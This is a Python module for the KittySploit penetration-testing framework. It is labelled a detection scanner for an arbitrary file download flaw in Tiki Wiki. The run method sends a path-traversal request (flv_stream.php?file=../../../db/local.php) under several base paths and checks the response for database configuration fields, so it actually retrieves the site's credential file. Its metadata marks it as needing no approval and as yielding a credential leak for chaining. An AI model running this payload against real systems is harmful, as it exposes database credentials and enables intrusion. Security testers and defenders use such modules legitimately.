#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tiki Wiki flv_stream.php arbitrary file download."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tiki Wiki - flv_stream.php File Download Detection',
        'description': (
            'Detects Tiki Wiki arbitrary file download via '
            '/vendor/player/flv/flv_stream.php?file=../../../db/local.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'tiki', 'lfi', 'info-leak', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential_leak', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [],
    }

    def run(self):
        for base in ('', '/tiki', '/tikiwiki'):
            path = f'{base}/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r:
                continue
            body = r.text or ''
            if 'dbversion_tiki' in body and 'user_tiki' in body and 'host_tiki' in body and 'dbs_tiki' in body:
                self.set_info(
                    severity='high',
                    reason='Tiki Wiki local.php disclosure via flv_stream.php',
                    path=path,
                )
                return True
        return False
